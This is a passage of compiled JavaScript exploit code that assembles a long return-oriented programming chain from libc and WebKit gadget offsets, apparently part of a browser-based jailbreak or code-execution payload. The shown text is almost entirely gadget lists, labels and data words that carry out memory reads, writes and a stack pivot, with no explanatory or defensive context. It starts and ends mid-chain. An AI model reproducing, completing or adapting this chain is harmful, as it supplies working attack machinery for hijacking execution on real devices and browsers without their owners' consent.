libc_base+772328
]);
//L1351:
db([0,0]);
set_gadget(libc_base+768796,);
//L1352:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+117952,//L1354
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1354:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+118008,//L1356
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1356:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+118080,//L1358
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1358:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+118136,//L1360
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1360:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L1361:
webkit_base+2847363,//mov [rdi],r9
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+118288,//L1364
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1362:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1364:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+118376,//L1366
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+118392,//L1367
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1366:
db([0,0]);
set_gadget(libc_base+772328,);
//L1367:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+118536,//L1370
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+118504,//L1368
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+118520,//L1369
webkit_base+4687784,
libc_base+165442
]);
//L1368:
db([0,0]);
set_gadget(libc_base+772328,);
//L1369:
db([0,0]);
set_gadget(libc_base+768796,);
//L1370:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+118608,//L1372
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1372:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+118664,//L1374
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1374:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+118760,//L1376
webkit_base+4687784,
libc_base+768796
]);
//L1375:
db([29,0]);// 0x1d
set_gadget(webkit_base+3789839,);//pop r11
//L1376:
db([0,0]);
set_gadget(libc_base+772328,);
//L1377:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+118856,//L1378
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+118872,//L1379
webkit_base+4687784,
libc_base+772328
]);
//L1378:
db([0,0]);
set_gadget(libc_base+768796,);
//L1379:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+118960,//L1381
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1381:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+119016,//L1383
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1383:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+119088,//L1385
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1385:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+119144,//L1387
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1387:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L1388:
libc_base+165442,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+119296,//L1391
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1389:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1391:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+119384,//L1393
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+119400,//L1394
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1393:
db([0,0]);
set_gadget(libc_base+772328,);
//L1394:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+119544,//L1397
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+119512,//L1395
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+119528,//L1396
webkit_base+4687784,
libc_base+165442
]);
//L1395:
db([0,0]);
set_gadget(libc_base+772328,);
//L1396:
db([0,0]);
set_gadget(libc_base+768796,);
//L1397:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+119616,//L1399
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1399:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+119672,//L1401
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1401:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+119768,//L1403
webkit_base+4687784,
libc_base+768796
]);
//L1402:
db([30,0]);// 0x1e
set_gadget(webkit_base+3789839,);//pop r11
//L1403:
db([0,0]);
set_gadget(libc_base+772328,);
//L1404:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+119864,//L1405
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+119880,//L1406
webkit_base+4687784,
libc_base+772328
]);
//L1405:
db([0,0]);
set_gadget(libc_base+768796,);
//L1406:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+119968,//L1408
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1408:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+120024,//L1410
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1410:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+120096,//L1412
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1412:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+120152,//L1414
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1414:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+120256,//L1417
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1415:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L1417:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+120344,//L1419
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+120360,//L1420
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1419:
db([0,0]);
set_gadget(libc_base+772328,);
//L1420:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+120504,//L1423
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+120472,//L1421
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+120488,//L1422
webkit_base+4687784,
libc_base+165442
]);
//L1421:
db([0,0]);
set_gadget(libc_base+772328,);
//L1422:
db([0,0]);
set_gadget(libc_base+768796,);
//L1423:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+120576,//L1425
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1425:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+120632,//L1427
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1427:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+120728,//L1429
webkit_base+4687784,
libc_base+768796
]);
//L1428:
db([7,0]);// 0x7
set_gadget(webkit_base+3789839,);//pop r11
//L1429:
db([0,0]);
set_gadget(libc_base+772328,);
//L1430:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+120824,//L1431
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+120840,//L1432
webkit_base+4687784,
libc_base+772328
]);
//L1431:
db([0,0]);
set_gadget(libc_base+768796,);
//L1432:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+120928,//L1434
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1434:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+120984,//L1436
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1436:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+121104,//L1439
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1437:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1439:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+121192,//L1441
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+121208,//L1442
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1441:
db([0,0]);
set_gadget(libc_base+772328,);
//L1442:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+121352,//L1445
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+121320,//L1443
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+121336,//L1444
webkit_base+4687784,
libc_base+165442
]);
//L1443:
db([0,0]);
set_gadget(libc_base+772328,);
//L1444:
db([0,0]);
set_gadget(libc_base+768796,);
//L1445:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+121424,//L1447
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1447:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+121480,//L1449
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1449:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+121576,//L1451
webkit_base+4687784,
libc_base+768796
]);
//L1450:
db([31,0]);// 0x1f
set_gadget(webkit_base+3789839,);//pop r11
//L1451:
db([0,0]);
set_gadget(libc_base+772328,);
//L1452:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+121672,//L1453
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+121688,//L1454
webkit_base+4687784,
libc_base+772328
]);
//L1453:
db([0,0]);
set_gadget(libc_base+768796,);
//L1454:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+121776,//L1456
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1456:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+121832,//L1458
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1458:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+121904,//L1460
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1460:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+121960,//L1462
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1462:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L1463:
libc_base+768796,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+122112,//L1466
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1464:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1466:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+122200,//L1468
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+122216,//L1469
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1468:
db([0,0]);
set_gadget(libc_base+772328,);
//L1469:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+122360,//L1472
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+122328,//L1470
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+122344,//L1471
webkit_base+4687784,
libc_base+165442
]);
//L1470:
db([0,0]);
set_gadget(libc_base+772328,);
//L1471:
db([0,0]);
set_gadget(libc_base+768796,);
//L1472:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+122432,//L1474
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1474:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+122488,//L1476
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1476:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+122584,//L1478
webkit_base+4687784,
libc_base+768796
]);
//L1477:
db([32,0]);// 0x20
set_gadget(webkit_base+3789839,);//pop r11
//L1478:
db([0,0]);
set_gadget(libc_base+772328,);
//L1479:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+122680,//L1480
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+122696,//L1481
webkit_base+4687784,
libc_base+772328
]);
//L1480:
db([0,0]);
set_gadget(libc_base+768796,);
//L1481:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+122784,//L1483
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1483:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+122840,//L1485
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1485:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+122912,//L1487
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1487:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+122968,//L1489
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1489:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+123072,//L1492
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1490:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1492:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+123160,//L1494
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+123176,//L1495
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1494:
db([0,0]);
set_gadget(libc_base+772328,);
//L1495:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+123320,//L1498
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+123288,//L1496
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+123304,//L1497
webkit_base+4687784,
libc_base+165442
]);
//L1496:
db([0,0]);
set_gadget(libc_base+772328,);
//L1497:
db([0,0]);
set_gadget(libc_base+768796,);
//L1498:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+123392,//L1500
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1500:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+123448,//L1502
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1502:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+123544,//L1504
webkit_base+4687784,
libc_base+768796
]);
//L1503:
db([37,0]);// 0x25
set_gadget(webkit_base+3789839,);//pop r11
//L1504:
db([0,0]);
set_gadget(libc_base+772328,);
//L1505:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+123640,//L1506
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+123656,//L1507
webkit_base+4687784,
libc_base+772328
]);
//L1506:
db([0,0]);
set_gadget(libc_base+768796,);
//L1507:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+123744,//L1509
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1509:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+123800,//L1511
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1511:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+123920,//L1514
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1512:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1514:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+124008,//L1516
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+124024,//L1517
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1516:
db([0,0]);
set_gadget(libc_base+772328,);
//L1517:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+124168,//L1520
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+124136,//L1518
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+124152,//L1519
webkit_base+4687784,
libc_base+165442
]);
//L1518:
db([0,0]);
set_gadget(libc_base+772328,);
//L1519:
db([0,0]);
set_gadget(libc_base+768796,);
//L1520:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+124240,//L1522
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1522:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+124296,//L1524
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1524:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+124392,//L1526
webkit_base+4687784,
libc_base+768796
]);
//L1525:
db([33,0]);// 0x21
set_gadget(webkit_base+3789839,);//pop r11
//L1526:
db([0,0]);
set_gadget(libc_base+772328,);
//L1527:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+124488,//L1528
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+124504,//L1529
webkit_base+4687784,
libc_base+772328
]);
//L1528:
db([0,0]);
set_gadget(libc_base+768796,);
//L1529:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+124592,//L1531
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1531:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+124648,//L1533
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1533:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+124720,//L1535
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1535:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+124776,//L1537
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1537:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L1538:
libc_base+430587,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+124928,//L1541
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1539:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1541:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+125016,//L1543
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+125032,//L1544
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1543:
db([0,0]);
set_gadget(libc_base+772328,);
//L1544:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+125176,//L1547
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+125144,//L1545
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+125160,//L1546
webkit_base+4687784,
libc_base+165442
]);
//L1545:
db([0,0]);
set_gadget(libc_base+772328,);
//L1546:
db([0,0]);
set_gadget(libc_base+768796,);
//L1547:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+125248,//L1549
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1549:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+125304,//L1551
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1551:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+125400,//L1553
webkit_base+4687784,
libc_base+768796
]);
//L1552:
db([34,0]);// 0x22
set_gadget(webkit_base+3789839,);//pop r11
//L1553:
db([0,0]);
set_gadget(libc_base+772328,);
//L1554:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+125496,//L1555
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+125512,//L1556
webkit_base+4687784,
libc_base+772328
]);
//L1555:
db([0,0]);
set_gadget(libc_base+768796,);
//L1556:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+125600,//L1558
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1558:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+125656,//L1560
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1560:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+125728,//L1562
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1562:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+125784,//L1564
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1564:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L1565:
libc_base+489696,//pop rsp
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+125936,//L1568
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1566:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1568:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+126024,//L1570
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+126040,//L1571
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1570:
db([0,0]);
set_gadget(libc_base+772328,);
//L1571:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+126184,//L1574
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+126152,//L1572
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+126168,//L1573
webkit_base+4687784,
libc_base+165442
]);
//L1572:
db([0,0]);
set_gadget(libc_base+772328,);
//L1573:
db([0,0]);
set_gadget(libc_base+768796,);
//L1574:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
